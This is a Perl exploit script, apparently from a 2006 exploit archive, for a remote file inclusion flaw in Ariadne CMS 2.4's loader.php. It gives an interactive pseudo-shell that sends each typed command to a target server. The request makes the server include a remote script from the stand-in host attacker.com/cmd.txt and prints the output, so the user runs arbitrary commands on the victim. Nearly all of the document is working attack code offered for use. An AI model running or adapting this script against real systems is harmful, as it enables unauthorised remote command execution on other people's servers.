#!/usr/bin/perl

#####################################################################################################
#                                                                                                   
#
# Ariadne CMS 2.4                                                                                   
#
#                                                                                                   
#
# Class:  Remote File Inclusion Vulnerability                                                       
#
# Date:   2006/10/19                                                                                
#
#                                                                                                   
#
# Remote: Yes                                                                                       
#
#                                                                                                   
#
# Type:   high                                                                                      
#
#                                                                                                   
#
# Site:   http://www.ariadne-cms.org/en/download/ariadne/ariadne.2.4.zip                            
#
#                                                                                                   
#
#####################################################################################################


use IO::Socket;
use LWP::Simple;

$cmdshell="http://attacker.com/cmd.txt";   # <====== Change This Line 
With Your Personal Script

print "\n";
print 
"##########################################################################\n";
print "#                                                                        
#\n";
print "# Ariadne CMS 2.4   Remote File Inclusion Vulnerability                  
#\n";
print "# Vul Files: loader.php , setlink.php & view.php                         
#\n";
print "# Bug Found By : Ashiyane Corporation                                    
#\n";
print "# Email: Alireza Ahari    Ahari[at]ashiyane.ir                           
#\n";
print "# Web Site : www.Ashiyane.ir                                             
#\n";
print "#                                                                        
#\n";
print 
"##########################################################################\n";


if (@ARGV < 2)
{
    print "\n Usage: Ashiyane.pl [host] [path] ";
    print "\n EX : Ashiyane.pl www.victim.com /path/  \n\n";
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$vul="loader.php?ariadne="

print "Type Your Commands ( uname -a )\n";
print "For Exiit Type END\n";

print "<Shell> ";$cmd = <STDIN>;

while($cmd !~ "END") {
    $socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host", 
PeerPort=>"80") or die "Could not connect to host.\n\n";

    print $socket "GET ".$path.$vul.$cmdshell."?cmd=".$cmd."? 
HTTP/1.1\r\n";
    print $socket "Host: ".$host."\r\n";
    print $socket "Accept: */*\r\n";
    print $socket "Connection: close\r\n\n";

    while ($raspuns = <$socket>)
    {
        print $raspuns;
    }

    print "<Shell> ";
    $cmd = <STDIN>;
} 
